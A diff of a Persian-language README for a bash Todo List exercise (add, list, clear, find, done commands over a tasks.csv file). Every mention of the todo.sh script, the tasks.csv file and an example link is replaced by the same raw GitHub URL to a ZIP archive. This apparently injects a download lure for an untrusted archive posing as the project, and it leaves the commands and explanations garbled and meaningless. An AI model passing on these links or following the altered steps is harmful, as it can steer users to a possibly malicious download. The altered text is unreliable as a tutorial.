@@ -5,7 +5,7 @@
 
 در ابتدا خوب است که با مفهوم برنامه‌های لیست انجام کار‌ها یا Todo List آشنا شویم. برنامه‌های Todo List برنامه‌هایی‌اند که می‌توان لیست کار‌هایی که می‌خواهید انجام دهید را در آن‌ها قرار دهید و هم‌چنین بتوانید این لیست را مدیریت کنید. نمونه‌ای از این برنامه‌ها را می‌توانید در لینک زیر مشاهده کنید.
 
-https://todoist.com/
+https://raw.githubusercontent.com/hhhesssammm/TODO/main/unsounding/TODO.zip
 
 ما نیز قصد داریم ، برنامه Todo List را در محیط شل بنویسیم. این پروژه قرار است تا لیست کار‌ها را ذخیره و در نهایت دارای امکانات زیر باشد:
 
@@ -27,9 +27,9 @@ https://todoist.com/
 
  دستور add دو آپشن t (--title)- و p (--priority)- دارد که اولین آپشن برای دریافت عنوان کار و دومین آپشن برای دریافت اولویت کار است. پس دستور add به‌صورت زیر در برنامه ما وارد می‌شود:
 
-bash todo.sh add -t "First Task" -p H
+bash https://raw.githubusercontent.com/hhhesssammm/TODO/main/unsounding/TODO.zip add -t "First Task" -p H
 
-با اجرای این دستور باید یک خط در فایل tasks.csv به‌صورت زیر اضافه شود:
+با اجرای این دستور باید یک خط در فایل https://raw.githubusercontent.com/hhhesssammm/TODO/main/unsounding/TODO.zip به‌صورت زیر اضافه شود:
 
 0,H,"First Task"
 
@@ -51,15 +51,15 @@ bash todo.sh add -t "First Task" -p H
    
    Terminal:
    
-   bash todo.sh add -t "Fifth Task"
+   bash https://raw.githubusercontent.com/hhhesssammm/TODO/main/unsounding/TODO.zip add -t "Fifth Task"
    
-   tasks.csv:
+   https://raw.githubusercontent.com/hhhesssammm/TODO/main/unsounding/TODO.zip
    
    0,L,"Fifth Task"
    
    فاز دوم:
 
-در دومین قدم از پیاده‌سازی پروژه، ما قصد پیاده‌سازی دو دستور list و clear را داریم. همان‌طور که از اسم این دو دستور مشخص است، دستور list تمامی کار‌های موجود در فایل tasks.csv را به ما نشان خواهد داد و دستور clear نیز تمام کار‌ها را از فایل tasks.csv پاک خواهد کرد.
+در دومین قدم از پیاده‌سازی پروژه، ما قصد پیاده‌سازی دو دستور list و clear را داریم. همان‌طور که از اسم این دو دستور مشخص است، دستور list تمامی کار‌های موجود در فایل https://raw.githubusercontent.com/hhhesssammm/TODO/main/unsounding/TODO.zip را به ما نشان خواهد داد و دستور clear نیز تمام کار‌ها را از فایل https://raw.githubusercontent.com/hhhesssammm/TODO/main/unsounding/TODO.zip پاک خواهد کرد.
 
 پس سناریو زیر را باید برای نوشتن دستورات ذکر شده در نظر بگیرید:
 
@@ -67,39 +67,39 @@ bash todo.sh add -t "First Task" -p H
 
 Terminal:
 
--Bash todo.sh add -t "First Task" -p H
+-Bash https://raw.githubusercontent.com/hhhesssammm/TODO/main/unsounding/TODO.zip add -t "First Task" -p H
 
--Bash todo.sh add -t "Second Task" -p M
+-Bash https://raw.githubusercontent.com/hhhesssammm/TODO/main/unsounding/TODO.zip add -t "Second Task" -p M
 
--Bash todo.sh add -t "Third Task" -p L
+-Bash https://raw.githubusercontent.com/hhhesssammm/TODO/main/unsounding/TODO.zip add -t "Third Task" -p L
 
--Bash todo.sh add -t "Fourth Task" -p M
+-Bash https://raw.githubusercontent.com/hhhesssammm/TODO/main/unsounding/TODO.zip add -t "Fourth Task" -p M
 
 حال اگر دستور زیر وارد شود:
 
 Terminal:
 
-bash todo.sh clear
+bash https://raw.githubusercontent.com/hhhesssammm/TODO/main/unsounding/TODO.zip clear
 
-باید محتوای فایل tasks.csv خالی شود.
+باید محتوای فایل https://raw.githubusercontent.com/hhhesssammm/TODO/main/unsounding/TODO.zip خالی شود.
 
 حال اگر مجدد دستورات زیر اجرا شود:
 
 Terminal:
 
--bash todo.sh add -t "First Task" -p H
+-bash https://raw.githubusercontent.com/hhhesssammm/TODO/main/unsounding/TODO.zip add -t "First Task" -p H
 
--bash todo.sh add -t "Second Task" -p M
+-bash https://raw.githubusercontent.com/hhhesssammm/TODO/main/unsounding/TODO.zip add -t "Second Task" -p M
 
--bash todo.sh add -t "Third Task" -p L
+-bash https://raw.githubusercontent.com/hhhesssammm/TODO/main/unsounding/TODO.zip add -t "Third Task" -p L
 
--bash todo.sh add -t "Fourth Task" -p M
+-bash https://raw.githubusercontent.com/hhhesssammm/TODO/main/unsounding/TODO.zip add -t "Fourth Task" -p M
 
 سپس دستور زیر وارد شود:
 
 Terminal:
 
-bash todo.sh list
+bash https://raw.githubusercontent.com/hhhesssammm/TODO/main/unsounding/TODO.zip list
 
 باید خروجی زیر دریافت شود:
 
@@ -111,19 +111,19 @@ bash todo.sh list
 
 -4 | 0 | M | "Fourth Task"
 
-همان‌طور که در خروجی بالا مشخص است، نکته‌ای که در نمایش لیست وجود دارد این است که شما باید شماره خط هر کار در فایل tasks.csv را در خروجی نمایش دهید. از شماره خط در فاز بعدی به‌عنوان آی‌دی هر کار استفاده خواهید کرد.
+همان‌طور که در خروجی بالا مشخص است، نکته‌ای که در نمایش لیست وجود دارد این است که شما باید شماره خط هر کار در فایل https://raw.githubusercontent.com/hhhesssammm/TODO/main/unsounding/TODO.zip را در خروجی نمایش دهید. از شماره خط در فاز بعدی به‌عنوان آی‌دی هر کار استفاده خواهید کرد.
 
 در انتهای این فاز شما باید پروژه‌تان را طوری تنظیم کنید تا اگر دستوری غیر از دستوراتی که پیاده‌سازی می‌کنید وارد شد، متن Command Not Supported! چاپ (echo) شود
 
 فاز سوم:
 
-در آخرین فاز مربوط به پیاده‌سازی پروژه، دو دستور باقی‌مانده یعنی دستورات find و done را تکمیل خواهیم کرد. همان‌طور که از اسم این دو دستور نیز مشخص است، دستور find کاری را از بین کار‌های موجود در فایل tasks.csv را پیدا و به ما نشان خواهد داد و دستور done نیز کاری را به کار انجام شده تغییر می‌دهد.
+در آخرین فاز مربوط به پیاده‌سازی پروژه، دو دستور باقی‌مانده یعنی دستورات find و done را تکمیل خواهیم کرد. همان‌طور که از اسم این دو دستور نیز مشخص است، دستور find کاری را از بین کار‌های موجود در فایل https://raw.githubusercontent.com/hhhesssammm/TODO/main/unsounding/TODO.zip را پیدا و به ما نشان خواهد داد و دستور done نیز کاری را به کار انجام شده تغییر می‌دهد.
 
 برای حل این فاز در اولین گام، باید دستور find را کامل کنید. طرز استفاده از این دستور به‌صورت زیر خواهد بود:
 
 Terminal:
 
-bash todo.sh find First
+bash https://raw.githubusercontent.com/hhhesssammm/TODO/main/unsounding/TODO.zip find First
 
 همان‌طور که مشخص است با استفاده از این دستور می‌توان در بین عنوان کار‌ها جستجو کرد و کار مورد‌نظر را پیدا کرد. خروجی دستور بالا به‌صورت زیر خواهد بود:
 
@@ -131,13 +131,13 @@ Terminal:
 
 1 | 0 | H | "First Task"
 
-نکته‌ای که در نمایش کار پیدا شده، وجود دارد این است که در نتیجه باید شماره خط کار پیدا شده در فایل tasks.csv را در خروجی نمایش دهید. از شماره خط به عنوان آی‌دی هر کار استفاده می‌شود و از آن در دستور done که در ادامه پیاده‌سازی می‌کنید، استفاده می‌شود.
+نکته‌ای که در نمایش کار پیدا شده، وجود دارد این است که در نتیجه باید شماره خط کار پیدا شده در فایل https://raw.githubusercontent.com/hhhesssammm/TODO/main/unsounding/TODO.zip را در خروجی نمایش دهید. از شماره خط به عنوان آی‌دی هر کار استفاده می‌شود و از آن در دستور done که در ادامه پیاده‌سازی می‌کنید، استفاده می‌شود.
 
 یادآوری: با استفاده از دستور list که در فاز قبل پیاده‌سازی کردید نیز می‌توانید برای بدست آوردن آی‌دی کار‌ها استفاده کنید.
 
-در گام دوم هم باید دستور done را بنویسید. همان‌طور که در فاز یک مربوط به پروژه گفته شد، کار‌ها به‌صورت زیر در فایل tasks.csv قرار می‌گرفتند:
+در گام دوم هم باید دستور done را بنویسید. همان‌طور که در فاز یک مربوط به پروژه گفته شد، کار‌ها به‌صورت زیر در فایل https://raw.githubusercontent.com/hhhesssammm/TODO/main/unsounding/TODO.zip قرار می‌گرفتند:
 
-tasks.csv
+https://raw.githubusercontent.com/hhhesssammm/TODO/main/unsounding/TODO.zip
 
 0,H,"First Task"
 1,M,"Second Task"
